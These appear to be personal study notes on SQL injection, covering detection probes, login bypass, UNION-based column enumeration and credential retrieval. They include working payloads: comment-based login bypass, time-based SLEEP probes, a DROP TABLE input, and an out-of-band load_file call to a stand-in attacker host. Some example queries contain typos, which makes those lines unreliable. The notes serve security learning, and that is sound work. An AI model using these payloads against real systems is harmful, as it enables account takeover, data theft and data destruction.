# SQL Injection (SQLi)

1. Web Security Vulnerability. 

2. Interfere with the queries that application makes to its database(DB).

3. causes persistent change to content/behaviour.

4. escalate - `compromise server/backend intra` and `DOS attacks`

## How to Detect?

Apply on every entry point in the Application i.e. `user-input fields`.

Example: 
1. login form
2. search box
3. URL parameter
4. cookies
5. HTTP-header
6. JSON/XML request body
7. hidden form fields 

### Login Form:
> username: `admin'--`          
> password: *bypassed* 

`--` is a comment hence all the query after `--` is bypassed.

databse will see:
> SELECT * FROM users WHERE username = 'admin' *-- AND password = 'secret123'* 

#### Why this suceed?

1. Many SQL queries are buit using `STRING CONCATINATION`
2. no `sanitization` or `parameterized inputs`

##### example:  
string concatination:

> " SELECT * FROM users WHERE username = ' " + user + " ' AND 
password = ' " + pass + " ' ;

parameterized query:

> SELECT * FROM users WHERE username = ? AND password = ? ;

`?` - parameter placeholder that tells the database “this value is data only”, preventing SQL injection.  
`""` - identifier   
`''` - string

### Detect SQLi manutally | submit Inputs:

1. **single qoute character** `'` -> look for error or anomalies
2. **by forcing TRUE and FALSE conditions**  
    check if the application responds differently in a consistent way. 
    > GET /product?id=5 AND 1=1     // true AND true = true  
    GET /product?id=5 AND 1=2       // true AND false - false

    if getting different response - SQLi exist 

3. **time-based blind SQLi**  
    Payloads designed to trigger time delays - executed within a SQL query, and look for differences in the time taken to respond. 
    > GET /product?id=5 AND SLEEP(5)   // if delay - SQLi exist   

4. **OAST payloads designed to trigger an out-of-band network interaction**  
    database send n/w request to the application  
    > UNION SELECT load-file("\\\\attacker.oastify.com/test")--

    DB execte the load-file()  
    DB try to access the remote n/w resource  
    cause DNS/SMB request   
    SQLi exist | confirms code execution inside SQL query.


### SQL injection in different parts of the query

1. **In `UPDATE` statements**:

    vulnerable query:
    > UPDATE users SET email = 'USER_INPUT' WHERE id = 5;  

    Attacker input:
    > test@mail.com', role='admin' --

    final query:
    > UPDATE users SET email='test@mail.com', role='admin' --' WHERE id=5;

    user has become admin.

2. **In `INSERT` statement**:

    vulnerable query:
    > INSERT INTO users (username, password) VALUES ('USER', 'PASS');

    Attacker input:
    > USER = attacker', 'x'); DROP TABLE users; --

    final query:
    > INSERT INTO users (username, password)   
    VALUES ('attacker', 'x'); DROP TABLE users; --', 'PASS');

    database is manipuated/deleted

3. **In SELECT statements, within the table or column name**
    
    this happends when dev dynamically buid indentifers

    vulnerable query:
    > SELECT 'user_inpu' FROM users;

    attackers input:
    > username FROM users' WHERE '1'='1

    final query:
    > SELECT username FROM users WHERE '1'='1';

    all the rows returned

4. **SELECT statement - ORDER BY clause**

    vulnerable query:
    > SELECT * FROM products ORDER BY USER_INPUT;

    attackes input:
    > price DESC, (SELECT SLEEP(5))

    final query:
    > SELECT * FROM products ORDER BY price DESC, (SELECT SLEEP(5));

    #### Order by is gold to for blind SQLi. WHY?  
    1. hard to secure  
    2. easy to test
    3. no need to change page contect to check for SQLi.  
        `WHERE` filter rows -> visble change  
        `ORDER BY` just sort the rows 
        hence page still loads.  
        No obvious Attacks.  
        easy to test repeatedly.  

    4. prefect for time-based SQLi
        > ORDER BY IF(1=1, SLEEP(5), price)  
    
    5. prefect for boolean based attacks
        > ORDER BY CASE WHEN 1=1 THEN price ELSE name END  

        vs  
        
        > ORDER BY CASE WHEN 1=2 THEN price ELSE name END

        If behavior differs → SQL executed.
 
    6. preaped statement dont work.  
        one can't do  
        > ORDER BY ?  
    
    ### if pentester see `GET /products?sort=price`, ORDER BY is injectable unless proved otherwise.


## Retive hidden data:

The URL for listing specific products is:  
> https://insecure-website.com/products?category=Gifts  

check the SQL query that is being send as a request.    
> SELECT * FROM products WHERE category = 'Gifts' AND released = 1

`release` is a intersing keyword here.  
It is being used to hide the product that is not released yet.    
We could assume for unreleased products, `released = 0`.

attacker'd modification to URL:
> https://insecure-website.com/products?category=Gifts'--

final SQL query:
> SELECT * FROM products WHERE category = 'Gifts' *--' AND released = 1*


**example**:  
> https://insecure-website.com/products?category=Gifts'+OR+1=1--

SQL query in request:
> SELECT * FROM products WHERE category = 'Gifts' OR 1+1 *--'release = 1*

## Subverting Application Logic - login bypass:

An application has a login page.  
It uses following SQL query to login:  
> SELECT * FROM users WHERE username = 'abc' AND password = 'abc@123'

You can bypass the password by login as any user just by using `--`
> username: john@a.com'--

final query becomes:
> SELECT * FROM username = 'john@a.com'*--' password = ''*

password is bypassed.  
attacker have access to user john@a.com account.

## SQLi UNION attacks:

It is used for retrievel of information and not login bypass.  

When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from `other tables` within the database.  

`UNION` combines the results of two SELECT queries into one single output.
>SELECT a, b FROM table1 UNION SELECT c, d FROM table2

- Rle 1 - **column number must match**  
    Both SELECTs must return the same number of columns.

- Rule 2 - **Data types must be compatible**
    column postion must make sense.
    - a ↔ c
    - b ↔ d

This attack only works when:
1. column count of attackers query must match with orignal query 
2. data type is matched 
3. output is refelected on the page 

#### How know number of coloum in original attack?
1. **inject series of `ORDER BY` clause** and increase the column index untill an error occurs.  
    > ' ORDER BY 1  
    ' ORDER BY 2  
    ' ORDER BY 3  
    etc.  

    `ORDER BY` allow to refer to column using index number. 

    column number that dont exit - DB throws error.  

2. **submitting a series of UNION SELECT payloads** specifying a different number of null values.
    > ' UNION SELECT NULL--  
    ' UNION SELECT NULL,NULL--  
    ' UNION SELECT NULL,NULL,NULL--  
    etc.  
    
    keep adding `null` until it works.  
    if number of null does not match number of column - DB throws error

    NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.   

    When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column.

    **what to look for?** 
    1. when null count is correct - aditional content within the HTTP response. eg- extra row on an HTML table.
    2. null value might trigger `nullPointerException` (app crash) - meaning column count is correct 
    3. worst case - same response | page look same | no error (method has become ineffective)

    **ORACLE**  
    On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table.  
    There is a built-in table on Oracle called `dual` which can be used for this purpose.
    > ' UNION SELECT NULL FROM DUAL--

### finding coloum with useful datatypes:  

The interesting data that you want to retrieve is normally in string form.  
means - `find one or more column with string compatible datatype.`

step:  
1. find number of columns.
2. probe each column to check if it can hold string data.  
    submit series `UNION SELECT` payloads that place a string value into each column in turn.  

    `example` : query returned 4 column.  
        the check for string datatype in columns will look like: 
    > ' UNION SELECT 'a',NULL,NULL,NULL--  
    ' UNION SELECT NULL,'a',NULL,NULL--  
    ' UNION SELECT NULL,NULL,'a',NULL--  
    ' UNION SELECT NULL,NULL,NULL,'a'--

    If the column data type is not compatible with string data, the injected query will cause a database error

    If no error - that column have a string values.

### SQLi UNION attack - Retrieving information  
Step #1 - determine the number of columns.      
Step #2 - identify the columns of string Data-type.  
**Step #3 - retrieve interesting information**  

To retrieve string information from the table - you **need to know**:  
1. **table name**
2. **columns name**

`example`:   
    suppose that:  
    table name = user,
    column name = username, password (both string DataType)  
   **retrieve information using query:**
> ' UNION SELECT username, password FROM users--

*All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.*